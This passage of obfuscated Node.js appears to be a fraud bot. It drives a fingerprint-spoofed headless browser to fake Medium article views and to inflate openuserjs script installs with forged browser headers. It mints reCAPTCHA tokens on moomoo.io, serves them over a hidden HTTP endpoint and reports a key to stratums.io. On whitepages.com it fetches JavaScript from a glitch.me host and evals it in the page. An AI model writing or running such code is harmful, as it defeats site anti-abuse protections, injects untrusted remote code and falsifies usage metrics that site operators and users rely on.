      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a0(0x2) + '-video-dow' + Z(0x6) + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + a0(0x1c) + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + Z(0x11) + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x337 * 0x9 + 0x1771 + -0x3460
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a1 = d;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x31a * -0x5 + 0xdfe + 0xc2 * 0x2)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log(a1(0xf) + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x11 * -0x9 + 0x145d * 0x1 + -0x1360), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x193 + 0xe08 + 0xcd * -0x13), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0xec1 + 0x7 * 0x25c + -0x1f45;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1e * -0x11c + -0x174 * -0x2 + 0x10 * -0x243; w < getRandomInt(0x1915 + 0x6 * 0x11 + -0x197a, 0x78 * -0x10 + 0x2581 + -0x1 * 0x1dfc); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x199f4 * 0x1 + -0x13304 + 0x8370);
        }
      }();
    }, -0x1 * -0x277 + 0x92 * -0x40 + 0x226d), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x1495 + 0x5d3 + -0x34d * 0x8;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x4cf * -0x1 + -0x1 * 0x1031 + 0xb62, -0xee * 0x7 + -0x3cc + -0x8 * -0x150)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x7d61 + -0x5 * -0x1c23 + 0x65e2);
    }, -0x189c + 0x25a1 + -0xca1), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const a2 = b;
        try {
          let s = -0x93 * -0xf + 0x7 * -0x157 + 0x4 * 0x31;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on'](a2(0xc, 'pN@Y'), function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x6 * -0x449 + 0x184e + 0xd20), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x63c * 0x3 + 0x170a + -0x456), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0xf4 * -0x3cb + -0x31eaa * 0x7 + 0x1ff4ca);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x80 * 0x4c + -0x1526 + 0x3b8a);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x12b2 * -0x1 + 0x4dc * -0x8 + 0x3a5a);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x1583 * -0x1 + 0x282 * -0xd + 0x2aa7);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0xa * -0x13a + 0x1 * -0xc23 + 0x1867 * 0x1);
    let h = e[f];
    if (b['atfXTb'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x73 * 0x25 + 0xd0b + -0x1daa, s, t, u = 0x4 * -0x5 + -0x2 * -0x319 + -0x61e; t = n['charAt'](u++); ~t && (s = r % (0x1aa8 + 0x145c * 0x1 + -0x4 * 0xbc0) ? s * (0x1f * 0x1d + -0x26 * -0x7a + 0x155f * -0x1) + t : t, r++ % (-0x613 + 0x2 * -0xa63 + 0x1add)) ? p += String['fromCharCode'](0xeac + -0x1 * -0x25d9 + -0x3386 & s >> (-(-0x2b * -0xd4 + 0x1 * 0x6b2 + -0x2a4c) * r & 0xaeb + 0x1ba6 + -0x268b)) : -0xd6f + 0x1ab8 + -0xd49) {
          t = o['indexOf'](t);
        }
        for (let v = 0x144 + -0x7e1 * 0x3 + 0x165f, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0xccb + -0x14c8 + 0x21a3))['slice'](-(-0xd1 * 0x1d + 0x2093 * 0x1 + -0x8e4));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x2 * 0x72f + 0x26ef + -0xaa9 * 0x5,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1514 + 0x425 * -0x4 + -0x788 * -0x5; u < -0xda * 0x2d + -0x1949 + 0x409b; u++) {
          p[u] = u;
        }
        for (u = 0x18a2 + 0x2ae * -0x2 + 0x1346 * -0x1; u < 0x5ba + -0x97b * -0x1 + -0xe35; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1b53 + 0x9b3 + -0x12a0 * -0x1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x23c3 + -0x3 * 0x4c + -0x22df, q = 0x4f * -0x3c + -0x2 * -0xbb9 + -0x4ee;
        for (let v = 0x8b6 + -0x2542 + 0x4 * 0x723; v < n['length']; v++) {
          u = (u + (-0x4 * 0x785 + -0x7b * -0x25 + 0x276 * 0x5)) % (-0x1c01 + 0x2 * -0xaa9 + 0x3253), q = (q + p[u]) % (0xba7 + -0x73c * 0x5 + 0x1 * 0x1985), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x22a + 0x1f * -0x25 + 0x351)]);
        }
        return t;
      };
      b['byfnja'] = m, c = arguments, b['atfXTb'] = !![];
    }
    const j = e[-0x25fe + 0x21 * 0x11 + 0x23cd],
      k = f + j,
      l = c[k];
    return !l ? (b['QrvTNa'] === undefined && (b['QrvTNa'] = !![]), h = b['byfnja'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
doFlags['doOUJS'] && ((async () => {
  const a5 = b;
  async function f() {
    const a4 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const a3 = c,
          A = j['random']();
        return [
          A,
          A['includes'](a3(0x1))
        ];
      }()),
      v = function(A, B = -0x4c * -0x7e + 0x249 + -0x27b0) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1 * -0x22e5 + 0xbaa + 0x1747 * -0x2));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x616 + 0x120f + -0x1 * 0x1825, D['indexOf']('\x20'));
        return B ? E['slice'](-0x1a0c + 0x16b1 + 0x35b, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x1 * -0x2903 + 0x28f8 + 0x271b),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + a4(0x12) + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x1a04 + 0x3707 * 0x1 + 0xa0d),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + a4(0xa) + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a5(0x18, 'fi!*') + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0xda1 * -0x1 + 0x8f + -0xe30 * 0x1; k < -0x15b1 + 0x24c5 * -0x1 + -0x1f3 * -0x1e; k++)
    setTimeout(f, (0x1 * -0x1943c + -0x814f + 0x2ffeb) * k * getRandomInt(-0x1 * -0x194 + 0xe * 0x3c + -0x4db, 0xb * 0x7 + -0x25bd + 0x2573));
  setInterval(() => {
    f();
